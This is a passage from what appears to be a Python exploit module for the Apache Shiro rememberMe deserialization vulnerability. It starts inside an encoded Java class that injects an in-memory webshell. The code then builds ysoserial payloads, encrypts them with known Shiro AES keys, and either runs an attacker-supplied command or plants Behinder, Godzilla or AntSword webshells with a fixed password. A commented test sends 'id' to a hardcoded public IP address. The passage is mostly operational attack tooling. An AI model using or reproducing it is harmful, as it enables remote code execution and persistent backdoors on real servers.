FJFUAEAJExvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAVChMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9GaWx0ZXI7KUxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUBAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7AQARamF2YS91dGlsL0VudW1TZXQBAAJvZgEAJShMamF2YS9sYW5nL0VudW07KUxqYXZhL3V0aWwvRW51bVNldDsBABhhZGRNYXBwaW5nRm9yVXJsUGF0dGVybnMBACooTGphdmEvdXRpbC9FbnVtU2V0O1pbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHU1RBUlRFRAEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEACmdldE1lc3NhZ2UBAAdpc0FycmF5AQADKClaAQARZ2V0RGVjbGFyZWRNZXRob2QBABBqYXZhL2xhbmcvU3lzdGVtAQAJYXJyYXljb3B5AQAqKExqYXZhL2xhbmcvT2JqZWN0O0lMamF2YS9sYW5nL09iamVjdDtJSSlWAQAEdHJpbQEABXdyaXRlAQAOZ2V0SW5wdXRTdHJlYW0BACQoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRJbnB1dFN0cmVhbTsBAAZleGlzdHMBAA1jcmVhdGVOZXdGaWxlAQARKExqYXZhL2lvL0ZpbGU7KVYBAARyZWFkAQAFKFtCKUkBAAcoW0JJSSlWAQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQAEbmV4dAEAB3ByaW50bG4BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAtnZXRSZWFsUGF0aAEADmdldFNlcnZsZXRQYXRoAQAPZ2V0QWJzb2x1dGVQYXRoAQAgamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24AIQB%2BAD0AAQB%2FAAQAAQCAAIEAAAABAIIAgwAAAAEAhACFAAAAAQCGAIUAAAAIAAEAhwCIAAEAiQAAAFkAAgABAAAAGyq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHsQAAAAIAigAAABoABgAAAB0ABAAYAAkAGQAOABoAFAAbABoAHgCLAAAADAABAAAAGwCMAI0AAAABAI4AjwABAIkAAAGQAAMABgAAALcqK7YACCoqtAACEgm5AAoCALUAB7sAC1m3AAxNEg1OEg06BCq0AAMSDrkADwIAKrQAAiq0AAW5ABACACq0AAMqtAAFuQARAgAsKrYAErYAE1enACE6BSy7ABVZtwAWEhe2ABgZBbYAGbYAGLYAGrYAE1cqtAADuQAbAQC7ABVZtwAWLbYAGCy2ABy2ABgZBLYAGLYAGrYAHSq0AAO5ABsBALYAHiq0AAO5ABsBALYAH6cABToFBKwAAgAjAFEAVAAUAHIAsACzABQAAwCKAAAASgASAAAAIQAFACIAFAAjABwAJAAfACUAIwAoAC4AKQA7ACoASAArAFEALgBUACwAVgAtAHIAMQCYADIApAAzALAANQCzADQAtQA3AIsAAAA%2BAAYAVgAcAJAAkQAFAAAAtwCMAI0AAAAAALcAkgCTAAEAHACbAJQAlQACAB8AmACWAIUAAwAjAJQAlwCFAAQAmAAAACMABP8AVAAFBwCZBwCaBwCbBwCcBwCcAAEHAJ0d9wBABwCdAQABAJ4AnwACAIkAAAQuAAcAEwAAAZYqtAACuQAgAQBMKk0qtAAHTiq0AAc6BCstuQAhAgDHAXUBOgUBOgYBOgcBOggBOgkrtgAiEiO2ACQ6BRkFBLYAJRkFK7YAJsAAJzoGGQa2ACISI7YAJDoFGQUEtgAlGQUZBrYAJsAAKDoHEikSKrYAJDoIGQgEtgAlGQgZB7IAK7YALCstLLkALQMAOgkZCbIALrgALwMEvQAwWQMZBFO5ADEEABIoEjIDvQAztgA0OgsZCwS2ADUZCxkHAcAANrYAN1cZCBkHsgA4tgAsAToKEjm4ADo6DKcADDoNEju4ADo6DBkHtgAiEjwDvQAztgA0Og0ZDRkHA70APbYAN8AANsAANsAANjoOAzYPFQ8ZDr6iAEUZDhUPMjoQGQwSPgO9ADO2ADQ6DRkNGRADvQA9tgA3wAAwOhEZES22AD%2BZABIZDhUPGQ4DMlMZDgMZEFOEDwGn%2F7kSQDoPGQ86EBkIGQeyADi2ACwZELA6CxkLtgBBOgoZCBkHsgA4tgAspwASOhIZCBkHsgA4tgAsGRK%2FGQqwEkKwAAUA0ADXANoAFAAwAV4BawAUADABXgGBAAABawF0AYEAAAGBAYMBgQAAAAMAigAAANIANAAAADsACgA8AAwAPQARAD4AFwA%2FACEAQAAkAEEAJwBCACoAQwAtAEQAMABIADsASQBBAEoATABLAFgATABeAE0AagBOAHMATwB5AFAAgwBRAI0AUgCkAFMAsQBUALcAVQDDAFYAzQBXANAAWwDXAF4A2gBcANwAXQDjAGAA8wBhAQkAYwEUAGQBGwBlASgAZgE4AGcBQQBoAUoAaQFQAGMBVgBtAVoAbgFeAHIBaABuAWsAbwFtAHABdAByAX4AcwGBAHIBjQBzAZAAdQGTAHcAiwAAAPIAGADXAAMAoAChAAwA3AAHAKIAkQANARsANQCjAJMAEAE4ABgApACFABEBDABKAKUApgAPALEAugCnAKgACwDjAIgAoAChAAwA8wB4AKkAqAANAQkAYgCqAKsADgFaABEArACFAA8A0ACbAK0AhQAKAW0ABwCuAJEACwF0AA0ArQCFAAoAJAFvAK8AsAAFACcBbACxALIABgAqAWkAswC0AAcALQFmALUAsAAIADABYwC2ALoACQGQAAMArQCFAAoAAAGWAIwAjQAAAAoBjAC7ALwAAQAMAYoAvQC%2BAAIAEQGFAL8AhQADABcBfwDAAIUABACYAAAAjgAJ%2FwDaAAwHAJkHAMEHAMIHAJwHAJwHAMMHAMQHAMUHAMMHAMYHAJwHAMcAAQcAnfwACAcAyP4AKAcAxwcANgH7AEP6AAX%2FABQACgcAmQcAwQcAwgcAnAcAnAcAwwcAxAcAxQcAwwcAxgABBwCdVQcAyfwADgcAnP8AAgAFBwCZBwDBBwDCBwCcBwCcAAAAygAAAAQAAQAUAAEAywDMAAEAiQAAAgYABAAGAAAA3yu2ACK2AEOZACUrwAA2wAA2wAA2TSosAzLAAES1AAIqLAQywABFtQADpwC1Eka4ADpNKiwSRwO9ADO2AEgrA70APbYAN8AARLUAAiosEkkDvQAztgBIKwO9AD22ADfAAEW1AAOnAHpNK8EARJkAciorwABEtQACKrQAArYAIhJKtgAkTi0EtgAlLSq0AAK2ACbAAEQ6BBkEtgAiEku2ACQ6BRkFBLYAJSoZBRkEtgAmwABFtQADpwAoTioqtAACtgAiEkkDvQAztgBIKwO9AD22ADfAAEW1AAOnAAU6BLEAAwAsAGQAZwAUAHcAtgC5ABQAugDZANwAFAADAIoAAABiABgAAAB8AAoAfQAVAH4AHwB%2FACkAgAAsAIIAMgCDAEsAhABkAJcAZwCFAGgAhgBvAIcAdwCKAIQAiwCJAIwAlgCNAKIAjgCoAI8AtgCVALkAkAC6AJIA2QCUANwAkwDeAJoAiwAAAFwACQAVABQAzQCrAAIAMgAyAM4AoQACAIQAMgDPALAAAwCWACAA0ACBAAQAogAUANEAsAAFALoAJACQAJEAAwBoAHYA0gCRAAIAAADfAIwAjQAAAAAA3wCSAJMAAQCYAAAAMwAFLHoHAJ3%2FAFEAAwcAmQcAmgcAnQABBwCd%2FwAiAAQHAJkHAJoHAJ0HAJ0AAQcAnfkAAQABANMA1AACAIkAAAA1AAAAAgAAAAGxAAAAAgCKAAAABgABAAAAnQCLAAAAFgACAAAAAQCMAI0AAAAAAAEA1QDWAAEAygAAAAQAAQDXAAgA2ADZAAEAiQAAAGgABQADAAAAHiq%2BK75gvQAwTSoDLAMqvrgATCsDLCq%2BK764AEwssAAAAAIAigAAABIABAAAAKAACQChABIAogAcAKMAiwAAACAAAwAAAB4A2gDbAAAAAAAeANwA2wABAAkAFQDdANsAAgABAN4A3wACAIkAAAWqAAQAEQAAAmorwABEOgQswABFOgUZBBJNuQAKAgA6BhkEEgm5AAoCADoHGQQSTrkACgIAOggZBBJPuQAKAgA6CRkGxgC9GQa2AFA6BhkFuQAbAQASUbYAUhkFuQAbAQAZBrYAUhkEuQBTAQA6CrsAVFkZBrcAVToLGQu2AFaaAFoZC7YAV1e7AFhZGQu3AFk6DBEEALwIOg0CNg4ZChkNtgBaWTYOAp8AEBkMGQ0DFQ62AFun%2F%2BgZDLYAXBkMtgBdGQW5ABsBALYAHhkFuQAbAQC2AB%2BnACMZBbkAGwEAEl62AFIZBbkAGwEAtgAeGQW5ABsBALYAHxkKtgBfpwF1GQfGAGoZCBJgtgBhOgoEvQAwWQMZB1MZCrgAYjoLuABjGQu2AGS2AGU6DLsAZlkZDLcAZxJotgBpOg0ZDbYAapkACxkNtgBrpwAFEg06DhkFuQAbAQA6DxkPGQ62AGwZD7YAHhkPtgAfpwEJGQnGAKAENgoSbbgAbjoLGQvGABMZC7YAbxJwtgBxmQAGAzYKFQqZABkGvQAwWQMSclNZBBJzU1kFGQlTpwAWBr0AMFkDEnRTWQQSdVNZBRkJUzoMuABjGQy2AGS2AGU6DbsAZlkZDbcAZxJotgBpOg4ZDrYAapkACxkOtgBrpwAFEg06DxkFuQAbAQA6EBkQGQ%2B2AGwZELYAHhkQtgAfpwBnGQS5ACABABJ2uQB3AgA6ChkEuQB4AQA6C7sAVFkSebcAVbYAejoMGQW5ABsBADoNGQ0Se7YAbBkNGQq2AGwZDRJ8tgBsGQ0ZC7YAbBkNEn22AGwZDRkMtgBsGQ22AB4ZDbYAH7EAAAADAIoAAAEGAEEAAACnAAYAqAAMAKkAFwCqACIAqwAtAKwAOACtAD0ArwBEALAAUACxAFwAsgBlALMAcAC0AHgAtQB%2BALYAiQC3AJAAuACTALkAoQC6AK4AvACzAL0AuAC%2BAMIAvwDMAMAAzwDBANsAwgDlAMMA7wDGAPQAyAD8AMoBBQDLARUAzAEiAM0BMgDOAUYAzwFPANABVgDRAVsA0gFgANQBaADVAWsA1gFyANcBhADYAYcA2gG3ANsBxADcAdQA3QHoAN4B8QDfAfgA4AH9AOECAgDiAgUA4wIVAOQCHgDlAiwA5gI1AOcCPADoAkMA6QJKAOoCUQDrAlgA7AJfAO0CZADuAmkA9ACLAAABQgAgAIkAQwDgAOEADACQADwAzQDiAA0AkwA5AOMApgAOAGUAjwDkAOUACgBwAIQA5gDnAAsBBQBbAOgA2wAKARUASwDpANsACwEiAD4A6gDlAAwBMgAuAOsA7AANAUYAGgCUAIUADgFPABEA7QDuAA8BawCXAO8A8AAKAXIAkADxAIUACwG3AEsA8gDbAAwBxAA%2BAOoA5QANAdQALgDrAOwADgHoABoAlACFAA8B8QARAO0A7gAQAhUAVADzAIUACgIeAEsA9ACFAAsCLAA9APUAhQAMAjUANADtAO4ADQAAAmoAjACNAAAAAAJqAM8A9gABAAACagDRAPcAAgAAAmoA%2BAD5AAMABgJkAIAAgQAEAAwCXgCCAIMABQAXAlMA%2BgCFAAYAIgJIAIYAhQAHAC0CPQD7AIUACAA4AjIA%2FACFAAkAmAAAANoAD%2F8AkwAPBwCZBwD9BwD%2BBwD%2FBwEABwEBBwCcBwCcBwCcBwCcBwECBwEDBwEEBwEFAQAAGvgAIB%2F5AAf%2FAEoADgcAmQcA%2FQcA%2FgcA%2FwcBAAcBAQcAnAcAnAcAnAcAnAcBBgcBBgcBAgcBBwAAQQcAnP8AHgAKBwCZBwD9BwD%2BBwD%2FBwEABwEBBwCcBwCcBwCcBwCcAAD9ACMBBwCcGlIHAQb%2BAC4HAQYHAQIHAQdBBwCc%2FwAeAAoHAJkHAP0HAP4HAP8HAQAHAQEHAJwHAJwHAJwHAJwAAPsAYwDKAAAABgACAQgA1wABAQkAiAABAIkAAAArAAAAAQAAAAGxAAAAAgCKAAAABgABAAAA9wCLAAAADAABAAAAAQCMAI0AAAACAQoAAAACAQsAuQAAAAoAAQC3AYUAuAYJ"
        ]
        if exp_data['type']=='cmd':
            cmd = exp_data['command']
            Model.key = sorted(set(Model.key),key=Model.key.index)
            Model.gadget = sorted(set(Model.gadget),key=Model.gadget.index)
            if len(Model.key) > 0 and len(Model.gadget) >0:
                random_str2 = random.randint(0,len(Model.key)-1)
                random_str3 = random.randint(0,len(Model.gadget)-1)
                Model.key2 = Model.key[random_str2]
                Model.gadget2 = Model.gadget[random_str3]
                heads = {
                    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
                    'cmd':cmd
                }
                if len(Model.gadget) > 0:
                    popen = subprocess.Popen(['java', '-jar', ysoserial, Model.gadget2, "123"], stdout=subprocess.PIPE)
                    BS = AES.block_size
                    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                    mode = AES.MODE_CBC
                    iv = uuid.uuid4().bytes
                    encryptor = AES.new(base64.b64decode(Model.key2), mode, iv)
                    file_body = pad(popen.stdout.read())
                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
                    payload = base64_ciphertext.decode()
                    r = requests.get(url, headers=heads, cookies={'rememberMe': payload}, verify=False,timeout=10)
                    if r.status_code == 200:
                        print(r.text)
                        result['Result_Info'] = r.text
                        result['Result'] = True

        if exp_data['type']=='memoryshell':
            memshellname = exp_data['memoryshellname']
            memshelltype = exp_data['memoryshelltype']
            memshelldata = "冰蝎"
            if "冰蝎" in memshelltype:
                memshelldata = memshell_list[0]
            if "哥斯拉" in memshelltype:
                memshelldata = memshell_list[1]
            if "蚁件" in memshelltype:
                memshelldata = memshell_list[2]
            Model.key = sorted(set(Model.key),key=Model.key.index)
            Model.gadget = sorted(set(Model.gadget),key=Model.gadget.index)
            if len(Model.key) > 0 and len(Model.gadget) >0:
                random_str2 = random.randint(0,len(Model.key)-1)
                random_str3 = random.randint(0,len(Model.gadget)-1)
                Model.key2 = Model.key[random_str2]
                Model.gadget2 = Model.gadget[random_str3]
                heads = {
                    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'p':'pass0000',
                    'path':memshellname
                }

                if len(Model.gadget) > 0:
                    echoGadget = Model.gadget2.split("_")
                    popen = subprocess.Popen(['java', '-jar', ysoserial, echoGadget[0]+"_Mem", "123"], stdout=subprocess.PIPE)
                    print(echoGadget[0]+"_Mem")
                    BS = AES.block_size
                    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                    mode = AES.MODE_CBC
                    iv = uuid.uuid4().bytes
                    encryptor = AES.new(base64.b64decode(Model.key2), mode, iv)
                    file_body = pad(popen.stdout.read())
                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
                    payload = base64_ciphertext.decode()
                    r = requests.post(url, headers=heads, cookies={'rememberMe': payload}, data ="user=" + memshelldata,verify=False,timeout=10)
                    if "success" in r.text:
                        result['Result'] = True
                        print(url + memshellname)
                        result['Result_Info'] = "注入成功路径为:\n" + url + memshellname + "\n" + "密码:pass0000"
                    if "exists" in r.text:
                        result['Result'] = True
                        result['Result_Info'] = "已经存在路径为:\n" + url + memshellname + "\n" + "密码:pass0000"
        return result
    except Exception as e:
        print(str(e))
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

if __name__== '__main__':
    do_poc("http://baidu.com",'127.0.0.1',8080,'http',heads={})
#     print(os.getcwd())
#
#     popen = subprocess.Popen(['java', '-jar', "C:\\Py3expZH\\ysoserial.jar", "CommonsCollections2", "directive:TomcatEcho2"], stdout=subprocess.PIPE)
#     BS = AES.block_size
#     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
#     mode = AES.MODE_CBC
#     iv = uuid.uuid4().bytes
#     print("冲冲冲")
#     encryptor = AES.new(base64.b64decode("kPH+bIxk5D2deZiIxcaaaA=="), mode, iv)
#     print("杀杀杀")
#     file_body = pad(popen.stdout.read())
#     print(file_body)
#     base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
#     payload = base64_ciphertext.decode()
#     heads = {
#         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
#         'cmd':'id',
#         'cookie': 'rememberMe='+payload
#     }
#
#     req = urllib.request.Request("http://123.58.236.76:33832",headers=heads)
#     response = urllib.request.urlopen(req)
#     print(response.read().decode("utf-8"))